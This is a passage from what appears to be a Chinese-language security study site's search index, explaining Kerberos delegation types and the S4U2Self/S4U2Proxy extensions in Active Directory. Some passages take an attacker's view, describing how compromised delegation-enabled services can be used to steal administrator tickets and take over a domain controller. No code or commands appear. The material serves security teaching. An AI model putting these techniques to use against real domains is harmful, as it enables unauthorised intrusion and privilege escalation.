176\u4ed6\u670d\u52a1\u8d26\u53f7\uff0c\u4f7f\u5f97\u670d\u52a1\u8d26\u53f7\u80fd\u4ee5\u7528\u6237\u6743\u9650\u8bbf\u95ee\u57df\u5185\u7684\u5176\u4ed6\u670d\u52a1\u3002</p> <p>\u5982\u56fe\u6240\u793a\u59d4\u6d3e\u6d41\u7a0b\uff0c\u57df\u7528\u6237 xie\\test \u4ee5Kerberos \u8eab\u4efd\u9a8c\u8bc1\u8bbf\u95eeWeb\u670d\u52a1\u5668\uff0c\u8bf7\u6c42\u4e0b\u8f7d\u6587\u4ef6\u3002\u4f46\u662f\u771f\u6b63\u7684\u6587\u4ef6\u5728\u540e\u53f0\u7684\u6587\u4ef6\u670d\u52a1\u5668\u4e0a\u3002\u4e8e\u662fWeb\u670d\u52a1\u5668\u7684\u670d\u52a1\u8d26\u53f7 websrv \u6a21\u62df\u57df\u7528\u6237 xie/test\uff0c\u4ee5 Kerberos \u534f\u8bae\u7ee7\u7eed\u8ba4\u8bc1\u5230\u540e\u53f0\u6587\u4ef6\u670d\u52a1\u5668\u3002\u540e\u53f0\u6587\u4ef6\u670d\u52a1\u5668\u5c06\u6587\u4ef6\u8fd4\u56de\u7ed9Web\u670d\u52a1\u5668\uff0cWeb\u670d\u52a1\u5668\u518d\u5c06\u6587\u4ef6\u8fd4\u56de\u7ed9\u57df\u7528\u6237 xie/test \u3002\u8fd9\u6837\uff0c\u5c31\u5b8c\u6210\u4e86\u4e00\u4e2a\u59d4\u6d3e\u7684\u6d41\u7a0b\u3002</p> <p>1.\u57df\u7528\u6237\u8bbf\u95eeWeb\u670d\u52a1\u5668\uff1a \u5047\u8bbe\u4f60\u662f\u7528\u6237 xie\\test\uff0c\u4f60\u73b0\u5728\u9700\u8981\u4ece\u4e00\u4e2aWeb\u670d\u52a1\u5668\u4e0a\u4e0b\u8f7d\u6587\u4ef6\u3002\u4f46\u8fd9\u4e9b\u6587\u4ef6\u5e76\u4e0d\u76f4\u63a5\u5b58\u50a8\u5728Web\u670d\u52a1\u5668\u4e0a\uff0c\u800c\u662f\u5728\u540e\u53f0\u7684\u6587\u4ef6\u670d\u52a1\u5668\u4e0a\u3002\u9996\u5148\uff0c\u4f60\u901a\u8fc7Kerberos\u534f\u8bae\u8ba4\u8bc1\u5e76\u8bbf\u95ee\u4e86Web\u670d\u52a1\u5668\uff0c\u8868\u660e\u4f60\u662f\u5408\u6cd5\u7528\u6237\u3002</p> <p>2.Web\u670d\u52a1\u5668\u4ee3\u8868\u4f60\u53bb\u8bbf\u95ee\u6587\u4ef6\u670d\u52a1\u5668\uff1a Web\u670d\u52a1\u5668\u672c\u8eab\u6ca1\u6709\u76f4\u63a5\u8bbf\u95ee\u6587\u4ef6\u7684\u6743\u9650\uff0c\u4f46\u4f60\u4f5c\u4e3a\u5408\u6cd5\u7528\u6237\u662f\u6709\u6743\u9650\u8bbf\u95ee\u6587\u4ef6\u670d\u52a1\u5668\u7684\u3002\u8fd9\u65f6\uff0cWeb\u670d\u52a1\u5668\uff08\u4f7f\u7528\u5b83\u7684\u670d\u52a1\u8d26\u53f7 websrv\uff09\u4f1a\u6a21\u62df\u4f60\uff0c\u4f7f\u7528Kerberos\u59d4\u6d3e\u6280\u672f\u4ee3\u8868\u4f60\u53bb\u540e\u53f0\u7684\u6587\u4ef6\u670d\u52a1\u5668\u8bf7\u6c42\u6587\u4ef6\u3002</p> <p>3.Kerberos\u59d4\u6d3e\u7684\u672c\u8d28\uff1a Kerberos\u534f\u8bae\u5141\u8bb8Web\u670d\u52a1\u5668\u4ee5\u4f60\u7684\u8eab\u4efd\uff08\u5373 xie\\test\uff09\u7ee7\u7eed\u8ba4\u8bc1\u5e76\u8bf7\u6c42\u6587\u4ef6\u670d\u52a1\u5668\u8bbf\u95ee\u8d44\u6e90\u3002\u6587\u4ef6\u670d\u52a1\u5668\u63a5\u53d7\u8fd9\u4e2a\u8bf7\u6c42\uff0c\u8ba4\u4e3a\u662f\u4f60\u672c\u4eba\u5728\u8bbf\u95ee\uff0c\u5c3d\u7ba1\u5b9e\u9645\u4e0a\u8bf7\u6c42\u662f\u901a\u8fc7Web\u670d\u52a1\u5668\u4f20\u9012\u7684\u3002</p> <p>4.\u6587\u4ef6\u670d\u52a1\u5668\u54cd\u5e94\u5e76\u8fd4\u56de\u6587\u4ef6\uff1a \u6587\u4ef6\u670d\u52a1\u5668\u9a8c\u8bc1\u4e86Web\u670d\u52a1\u5668\u662f\u4ee5\u4f60 xie\\test \u7684\u8eab\u4efd\u8fdb\u884c\u8bbf\u95ee\uff0c\u5e76\u4e14\u8fd9\u4e2a\u8eab\u4efd\u6709\u6743\u9650\u8bbf\u95ee\u8be5\u6587\u4ef6\u3002\u4e8e\u662f\uff0c\u6587\u4ef6\u670d\u52a1\u5668\u5c06\u8bf7\u6c42\u7684\u6587\u4ef6\u8fd4\u56de\u7ed9Web\u670d\u52a1\u5668\u3002</p> <p>5.Web\u670d\u52a1\u5668\u518d\u8fd4\u56de\u6587\u4ef6\u7ed9\u4f60\uff1a Web\u670d\u52a1\u5668\u5f97\u5230\u4e86\u6587\u4ef6\u540e\uff0c\u518d\u5c06\u6587\u4ef6\u8fd4\u56de\u7ed9\u4f60\uff08xie\\test\uff09\uff0c\u5b8c\u6210\u6574\u4e2a\u8bf7\u6c42\u6d41\u7a0b\u3002</p> <p>\u59d4\u6d3e\u7684\u6838\u5fc3\uff1a</p> <p>1.Web\u670d\u52a1\u5668\u5e76\u4e0d\u662f\u4ee5\u81ea\u5df1\u7684\u8eab\u4efd\u53bb\u8bf7\u6c42\u6587\u4ef6\uff0c\u800c\u662f\u501f\u7528\u4e86\u4f60\u7684\u8eab\u4efd\u3002</p> <p>2.\u6587\u4ef6\u670d\u52a1\u5668\u76f8\u4fe1Web\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u5b83\u901a\u8fc7Kerberos\u59d4\u6d3e\u6280\u672f\u9a8c\u8bc1\u4e86Web\u670d\u52a1\u5668\u786e\u5b9e\u662f\u5728\u4ee3\u8868\u4f60\u884c\u4e8b\u3002</p> <p></p> <p>\u5728\u57df\u4e2d\uff0c\u53ea\u6709 \u4e3b\u673a\u8d26\u53f7 \u548c \u670d\u52a1\u8d26\u53f7 \u624d\u5177\u6709\u59d4\u6d3e\u5c5e\u6027</p> <ul> <li>\u4e3b\u673a\u8d26\u53f7\u5c31\u662f\u6d3b\u52a8\u76ee\u5f55\u4e2d<code>Computers</code> \u4e2d\u7684\u8ba1\u7b97\u673a\uff0c\u4e5f\u53ef\u4ee5\u79f0\u4e3a\u673a\u5668\u8d26\u53f7\u3002</li> <li>\u670d\u52a1\u8d26\u53f7\u662f\u57df\u5185\u7528\u6237\u8d26\u53f7\u7684\u4e00\u79cd\u7c7b\u578b\uff0c\u662f\u5c06\u670d\u52a1\u8fd0\u884c\u8d77\u6765\u5e76\u52a0\u5165\u57df\u65f6\u6240\u7528\u7684\u8d26\u53f7\u3002\u4f8b\u5982<code>SQL Server</code>\u5728\u5b89\u88c5\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u81ea\u52a8\u6ce8\u518c\u670d\u52a1\u8d26\u53f7<code>SQLServiceAccount</code>\uff0c\u4e5f\u53ef\u4ee5\u5c06\u57df\u7528\u6237\u901a\u8fc7\u6ce8\u518c SPN \u53d8\u4e3a\u670d\u52a1\u8d26\u53f7\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_3","title":"\u59d4\u6d3e\u7684\u5206\u7c7b","text":"<p>\u57df\u5185\u59d4\u6d3e\u4e3b\u8981\u6709 3 \u79cd\u5e94\u7528\u65b9\u5f0f\uff1a<code>\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff08UD\uff1aUnconstrained Delegation\uff09</code>\u3001<code>\u7ea6\u675f\u6027\u59d4\u6d3e\uff08CD\uff1aConstrained Delegation\uff09</code>\u548c <code>\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e(RBCD\uff1aResource Based Constrained Delegation)</code>\u3002\u73b0\u5728\u8ba9\u6211\u4eec\u6765\u5177\u4f53\u770b\u770b\u8fd9\u4e09\u79cd\u59d4\u6d3e\u4e4b\u95f4\u7684\u8054\u7cfb\u548c\u5dee\u5f02\u3002</p> \u975e\u7ea6\u675f\u6027\u59d4\u6d3e  UD \u7ea6\u675f\u6027\u59d4\u6d3e  CD \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e  RBCD \u5b89\u5168\u6027 \u4f4e \u8f83\u9ad8 \u6700\u9ad8 \u5de5\u4f5c\u65b9\u5f0f \u670d\u52a1\u53ef\u4ee5\u81ea\u7531\u4ee3\u8868\u7528\u6237\u8bbf\u95ee\u6240\u6709\u8d44\u6e90 \u7ea6\u7531\u7ba1\u7406\u5458\u6307\u5b9a\u53ef\u4ee5\u8bbf\u95ee\u7684\u8d44\u6e90 \u8d44\u6e90\u6240\u6709\u8005\u81ea\u5df1\u63a7\u5236\u8bbf\u95ee\u6743\u9650 \u7b80\u5355\u7406\u89e3 Web\u670d\u52a1\u5668\u83b7\u5f97\u4e86\u7528\u6237\u7684\u4e07\u80fd\u94a5\u5319(TGT),\u53ef\u4ee5\u7528\u8fd9\u628a\u94a5\u5319\u6253\u5f00\u4efb\u610f\u95e8(\u8d44\u6e90) Web\u670d\u52a1\u5668\u83b7\u5f97\u4e86\u7528\u6237\u7684\u7279\u5b9a\u94a5\u5319,\u8fd9\u628a\u94a5\u5319\u53ea\u80fd\u6253\u5f00\u7279\u5b9a\u7684\u95e8(\u6587\u4ef6\u670d\u52a1\u5668) \u8d44\u6e90\u672c\u8eab\u63a7\u5236\u4e86\u8c01\u53ef\u4ee5\u4ee3\u8868\u7528\u6237\u6765\u8bbf\u95ee\u5b83,\u53ea\u6709\u7279\u5b9a\u7684\u670d\u52a1(\u4f8b\u5982Web\u670d\u52a1\u5668)\u624d\u80fd\u83b7\u5f97\u94a5\u5319\u8fdb\u5165\u8fd9\u4e2a\u8d44\u6e90\u3002 \u98ce\u9669 \u670d\u52a1\u88ab\u653b\u51fb\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6a2a\u5411\u79fb\u52a8 \u5fc5\u987b\u7531\u7ba1\u7406\u5458\u624b\u52a8\u914d\u7f6e \u914d\u7f6e\u590d\u6742\uff0c\u9700\u8981\u826f\u597d\u7684\u7ba1\u7406"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1","title":"1.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e","text":"<p>\u5728 Windows Server2000 \u9996\u6b21\u53d1\u5e03 Active Directory \u65f6\uff0cMicrosoft \u5c31\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u673a\u5236\u6765\u652f\u6301\u7528\u6237\u901a\u8fc7 Kerberos \u5411 Web \u670d\u52a1\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u5e76\u9700\u8981\u4ee3\u8868\u8be5\u7528\u6237\u66f4\u65b0\u540e\u7aef\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u7684\u8bb0\u5f55\u7684\u65b9\u6848\uff0c\u8fd9\u5c31\u662f\u6700\u65e9\u7684<code>\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff08UD\uff1aUnconstrained Delegation\uff09</code>\u3002\u5bf9\u4e8e\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u670d\u52a1\u8d26\u53f7\u53ef\u4ee5\u83b7\u53d6\u88ab\u59d4\u6d3e\u7528\u6237\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u5e76\u5c06 TGT \u8ba4\u8d2d\u6743\u8bc1\u7f13\u5b58\u5230 <code>LSASS</code> \u8fdb\u7a0b\u4e2d\uff0c\u4ece\u800c\u670d\u52a1\u8d26\u53f7\u53ef\u4f7f\u7528\u8be5 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u6a21\u62df\u8be5\u7528\u6237\u8bbf\u95ee\u4efb\u610f\u670d\u52a1\u3002\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u8bbe\u7f6e\u9700\u8981<code>SeEnableDelegationPrivilege</code> \u7279\u6743\uff0c\u8be5\u7279\u6743\u9ed8\u8ba4\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458\u548c\u4f01\u4e1a\u7ba1\u7406\u5458\u3002</p> <p>\u5f53\u7528\u6237\u4f7f\u7528Kerberos\u534f\u8bae\u767b\u5f55\u5e76\u8bbf\u95ee\u67d0\u4e2a\u670d\u52a1\uff08\u6bd4\u5982Web\u670d\u52a1\u5668\uff09\uff0cKerberos\u4f1a\u4e3a\u8be5\u7528\u6237\u9881\u53d1\u4e00\u4e2aTGT\u3002\u5728\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u4e2d\uff0c\u670d\u52a1\u8d26\u53f7\uff08\u4f8b\u5982Web\u670d\u52a1\u5668\u7684websrv\u8d26\u53f7\uff09\u53ef\u4ee5\u83b7\u53d6\u8be5\u7528\u6237\u7684TGT\u3002\u8fd9\u610f\u5473\u7740\uff0c\u670d\u52a1\u8d26\u53f7\u53ef\u4ee5\u62ff\u5230\u7528\u6237\u7684\"\u8eab\u4efd\u51ed\u636e\"\uff0c\u5373TGT\u3002</p> <p>\u5728\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6a21\u5f0f\u4e0b\uff0c\u5f53\u7528\u6237\u901a\u8fc7Kerberos\u534f\u8bae\u767b\u5f55\u5e76\u8bbf\u95ee\u67d0\u4e2a\u670d\u52a1\u65f6\uff0c\u8be5\u670d\u52a1\u7684\u8d26\u53f7\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u6237\u7684TGT\uff08\u8eab\u4efd\u51ed\u636e\uff09\u3002\u8be5TGT\u4f1a\u88ab\u7f13\u5b58\u5230LSASS\u8fdb\u7a0b\u4e2d\uff0c\u4ee5\u4fbf\u540e\u7eed\u4f7f\u7528\u3002\u62e5\u6709\u8fd9\u4e2aTGT\u7684\u670d\u52a1\u8d26\u53f7\u53ef\u4ee5\u6a21\u62df\u8be5\u7528\u6237\uff0c\u4ee3\u8868\u7528\u6237\u8bbf\u95ee\u5176\u4ed6Kerberos\u8ba4\u8bc1\u7684\u670d\u52a1\uff0c\u800c\u65e0\u9700\u518d\u6b21\u8be2\u95ee\u7528\u6237\u7684\u51ed\u636e\u6216\u5bc6\u7801\u3002</p> <ul> <li>\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u5c5e\u6027\u7684\u673a\u5668\u8d26\u53f7\u7684<code>userAccountControl</code> \u5c5e\u6027\u6709\u4e2aFlag \u4f4d\uff1a<code>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</code>\uff0c\u5176\u5bf9\u5e94\u7684\u6570\u662f <code>0x81000=528384</code>\uff0c\u5982\u56fe\u6240\u793a\u3002</li> <li>\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u5c5e\u6027\u7684\u670d\u52a1\u8d26\u53f7\u7684<code>userAccountControl</code>\u5c5e\u6027\u6709\u4e2aFlag \u4f4d\uff1a<code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>\uff0c\u5176\u5bf9\u5e94\u7684\u6570\u662f <code>0x80200=524800</code>\uff0c\u5982\u56fe\u6240\u793a\u3002</li> </ul> <p></p> <p></p> <p>\u6ce8\uff1a\u57df\u63a7\u5236\u5668\u9ed8\u8ba4\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_4","title":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b","text":"<p>\u4e0b\u56fe\u6240\u793a\u662f\u5fae\u8f6f\u5b98\u65b9\u5bf9\u4e8e\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b\u7684\u4ecb\u7ecd\uff1a</p> <p></p> <p>\u5728\u8be5\u6d41\u7a0b\u4e2d\uff0cTGT1 \u8ba4\u8d2d\u6743\u8bc1\u8bf7\u6c42\u7684 ST \u670d\u52a1\u7968\u636e\u7528\u4e8e\u8bbf\u95ee service1 \u670d\u52a1\uff0cTGT2\u8ba4\u8d2d\u6743\u8bc1\u8bf7\u6c42\u7684 ST \u670d\u52a1\u7968\u636e\u7528\u4e8e\u8bbf\u95ee service2 \u670d\u52a1\u3002</p> <p>\u4ece\u7f51\u7edc\u653b\u51fb\u8005\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5982\u679c\u653b\u51fb\u8005\u63a7\u5236\u4e86 service1\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u8bf1\u9a97\u57df\u7ba1\u7406\u5458\u6765\u8bbf\u95ee service1 \u670d\u52a1\uff0c\u7136\u540e\u653b\u51fb\u8005\u53ef\u4ee5\u5728 service1 \u673a\u5668\u4e0a\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u7684TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u4ece\u800c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u7f13\u5b58\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u6a21\u62df\u7ba1\u7406\u5458\u8bbf\u95ee\u4efb\u610f\u670d\u52a1\uff0c\u5305\u62ec\u57df\u63a7\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2","title":"2.\u7ea6\u675f\u6027\u59d4\u6d3e","text":"<p>\u7531\u4e8e\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e0d\u5b89\u5168\u6027\uff0c\u5fae\u8f6f\u5728 Windows Server 2003 \u4e2d\u53d1\u5e03\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u5bf9\u4e8e<code>\u7ea6\u675f\u6027\u59d4\u6d3e\uff08Constrained Delegation\uff09</code>\uff0c\u670d\u52a1\u8d26\u53f7\u53ea\u80fd\u83b7\u53d6\u8be5\u7528\u6237\u5bf9\u6307\u5b9a\u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u4ece\u800c\u53ea\u80fd\u6a21\u62df\u8be5\u7528\u6237\u8bbf\u95ee\u7279\u5b9a\u7684\u670d\u52a1\u3002\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u7684<code>msDS-AllowedToDelegateTo</code>\u5c5e\u6027\u4f1a\u6307\u5b9a\u5bf9\u54ea\u4e2a<code>SPN</code>\u8fdb\u884c\u59d4\u6d3e\u3002\u7ea6\u675f\u59d4\u6d3e\u7684\u8bbe\u7f6e\u9700\u8981<code>SeEnableDelegationPrivilege</code>\u7279\u6743\uff0c\u8be5\u7279\u6743\u9ed8\u8ba4\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458\u548c\u4f01\u4e1a\u7ba1\u7406\u5458\u3002</p> <p>\u7ea6\u675f\u6027\u59d4\u6d3e\u6709\u4e24\u79cd\uff1a</p> <ul> <li> <p>\u4e00\u79cd\u662f\u4ec5\u4f7f\u7528 Kerberos(K)\uff0c\u4e5f\u5c31\u662f\u4e0d\u80fd\u8fdb\u884c\u534f\u8bae\u8f6c\u6362\uff0c\u5982\u56fe\u6240\u793a\u3002</p> </li> <li> <p>\u53e6\u4e00\u79cd\u662f\u4f7f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae(N)\uff0c\u4e5f\u5c31\u662f\u80fd\u8fdb\u884c\u534f\u8bae\u8f6c\u6362\uff0c\u5982\u56fe\u6240\u793a\u3002</p> </li> </ul> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_5","title":"\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b","text":"<p>\u4e3a\u4e86\u5728 Kerberos \u534f\u8bae\u5c42\u9762\u5bf9\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u652f\u6301\uff0c\u5fae\u8f6f\u5bf9 Kerberos \u534f\u8bae\u6269\u5c55\u4e86\u4e24\u4e2a\u5b50\u534f\u8bae <code>S4u2self(Service for User to Self)</code>\u548c <code>S4u2Proxy (Service for User to Proxy )</code>\u3002<code>S4u2self</code> \u53ef\u4ee5\u4ee3\u8868\u4efb\u610f\u7528\u6237\u8bf7\u6c42\u9488\u5bf9\u81ea\u8eab\u7684 ST \u670d\u52a1\u7968\u636e\uff1b<code>S4u2Proxy</code> \u53ef\u4ee5\u7528\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684 ST \u670d\u52a1\u7968\u636e\u4ee5\u7528\u6237\u7684\u540d\u4e49\u8bf7\u6c42\u9488\u5bf9\u5176\u5b83\u6307\u5b9a\u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\u3002</p> <p>\u5982\u56fe\u6240\u793a\u662f\u5fae\u8f6f\u5b98\u65b9\u5bf9\u4e8e\u4f7f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae(N)\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b\u7684\u4ecb\u7ecd\uff1a</p> <p></p> <p>\u4ece\u7f51\u7edc\u653b\u51fb\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5982\u679c\u653b\u51fb\u8005\u63a7\u5236\u4e86 <code>Service1</code> \u7684\u670d\u52a1\u8d26\u53f7\uff0c\u5e76\u4e14<code>Service1</code>\u914d\u7f6e\u4e86\u5230\u57df\u63a7\u7684 <code>CIFS</code> \u670d\u52a1\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 <code>Service1</code> \u4ee5\u4efb\u610f\u7528\u6237\u6743\u9650(\u5305\u62ec\u57df\u7ba1\u7406\u5458)\u8bbf\u95ee\u57df\u63a7\u7684 <code>CIFS</code> \u670d\u52a1\uff0c\u5373\u76f8\u5f53\u4e8e\u63a7\u5236\u4e86\u57df\u63a7\u3002</p> <p>\u6574\u4e2a\u6d41\u7a0b\u7b80\u5316\u70b9\u6982\u62ec\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1s4u2self","title":"1\uff09S4u2Self","text":"<p>S4u2self \u53ef\u4ee5\u4ee3\u8868\u4efb\u610f\u7528\u6237\u8bf7\u6c42\u9488\u5bf9\u81ea\u8eab\u7684\u53ef\u8f6c\u53d1 ST \u670d\u52a1\u7968\u636e\u3002\u5f53\u7528\u6237\u4ee5\u5176\u4ed6\u65b9\u5f0f\uff1a\u5982 NTLM \u8ba4\u8bc1\u3001\u57fa\u4e8e\u8868\u5355\u7684\u8ba4\u8bc1\u7b49\u65b9\u5f0f\u4e0e Web \u670d\u52a1\u8fdb\u884c\u8ba4\u8bc1\u540e\uff0c\u7528\u6237\u662f\u65e0\u6cd5\u5411 Web \u670d\u52a1\u5668\u63d0\u4f9b\u8bf7\u6c42\u8be5\u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\u3002\u56e0\u800c\u670d\u52a1\u5668\u4e5f\u65e0\u6cd5\u8fdb\u4e00\u6b65\u4f7f\u7528<code>S4U2Proxy</code>\u534f\u8bae\u8bf7\u6c42\u8bbf\u95ee\u670d\u52a1 B\u3002<code>S4U2Self</code>\u534f\u8bae\u4fbf\u662f\u89e3\u51b3\u8be5\u95ee\u9898\u7684\u65b9\u6848\uff0c\u88ab\u914d\u7f6e\u4e3a\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u53f7\u80fd\u591f\u8c03\u7528<code>S4U2Self</code>\u534f\u8bae\u5411 KDC \u7533\u8bf7\u4e3a\u4efb\u610f\u7528\u6237\u8bf7\u6c42\u8bbf\u95ee\u81ea\u8eab\u7684\u53ef\u8f6c\u53d1\u7684\u670d\u52a1\u7968\u636e\u3002\u6b64\u540e\uff0c\u4fbf\u53ef\u901a\u8fc7 <code>S4U2Proxy</code> \u534f\u8bae\u4ee5\u6307\u5b9a\u7528\u6237\u7684\u8eab\u4efd\u4f7f\u7528\u8fd9\u5f20\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u5411\u57df\u63a7\u5236\u5668\u8bf7\u6c42\u8bbf\u95ee\u670d\u52a1 B \u7684 ST \u670d\u52a1\u7968\u636e\u3002\u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f\uff0c\u670d\u52a1\u4f7f\u7528<code>S4U2Proxy</code>\u534f\u4ee3\u8868\u7528\u6237\u83b7\u5f97\u9488\u5bf9\u670d\u52a1\u81ea\u8eab ST \u7968\u636e\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u4e0d\u9700\u8981\u7528\u6237\u51ed\u636e\u7684\uff01\u5982\u56fe\u6240\u793a\uff0c\u662f<code>S4u2self</code>\u7684\u8fc7\u7a0b\uff1a</p> <p></p> <p>\u6ce8\uff1a\u867d\u7136 S4U2Self \u534f\u8bae\u5141\u8bb8\u670d\u52a1\u4ee3\u8868\u7528\u6237\u5411 KDC \u8bf7\u6c42\u4e00\u5f20\u8bbf\u95ee\u81ea\u8eab\u670d\u52a1\u7684 ST\u670d\u52a1\u7968\u636e\uff0c\u4f46\u662f\u6b64\u534f\u8bae\u6269\u5c55\u4e0d\u5141\u8bb8\u670d\u52a1\u4ee3\u8868\u7528\u6237\u5411 KDC \u8bf7\u6c42\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u7684 ST\u670d\u52a1\u7968\u636e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2s4u2proxy","title":"2\uff09S4u2Proxy","text":"<p>S4u2Proxy \u53ef\u4ee5\u7528\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684\u53ef\u8f6c\u53d1 ST \u670d\u52a1\u7968\u636e\u4ee5\u7528\u6237\u7684\u540d\u4e49\u8bf7\u6c42\u9488\u5bf9\u5176\u5b83\u6307\u5b9a\u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\u3002S4U2Proxy \u4f7f\u5f97\u670d\u52a1 A \u53ef\u4ee5\u4f7f\u7528\u6765\u81ea\u7528\u6237 test \u7684\u6388\u6743\uff0c\u7136\u540e\u4ee5\u7528\u6237 test \u7684\u8eab\u4efd\u5411 KDC \u8bf7\u6c42\u8bbf\u95ee\u670d\u52a1 B \u7684 ST \u670d\u52a1\u7968\u636e\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f<code>S4u2Proxy</code>\u7684\u8fc7\u7a0b\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3","title":"3.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e","text":"<p>\u4e3a\u4e86\u4f7f\u7528\u6237\u548c\u8d44\u6e90\u66f4\u52a0\u72ec\u7acb\uff0c\u5fae\u8f6f\u5728 <code>Windows Server 2012</code> \u4e2d\u5f15\u5165\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u4e0d\u9700\u8981\u57df\u7ba1\u7406\u5458\u6743\u9650\u53bb\u8bbe\u7f6e\uff0c\u800c\u662f\u628a\u8bbe\u7f6e\u5c5e\u6027\u7684\u6743\u9650\u8d4b\u4e88\u7ed9\u4e86\u673a\u5668\u81ea\u8eab\u3002\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u5141\u8bb8\u8d44\u6e90\u914d\u7f6e\u53d7\u4fe1\u4efb\u7684\u5e10\u6237\u59d4\u6d3e\u7ed9\u4ed6\u4eec\u3002\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u53ea\u80fd\u5728\u8fd0\u884c Windows Server 2012 \u548c Windows Server 2012 R2 \u53ca\u4ee5\u4e0a\u7684\u57df\u63a7\u5236\u5668\u4e0a\u914d\u7f6e\uff0c\u4f46\u53ef\u4ee5\u5728\u6df7\u5408\u6a21\u5f0f\u6797\u4e2d\u5e94\u7528\u3002\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u7684 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u7684\u503c\u4e3a\u88ab\u5141\u8bb8\u59d4\u6d3e\u8d26\u53f7\u7684 SID\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u5e76\u4e14\u59d4\u6d3e\u5c5e\u6027\u8fd9\u91cc\u6ca1\u6709\u4efb\u4f55\u503c\uff0c\u5982\u56fe\u6240\u793a\u3002</p> 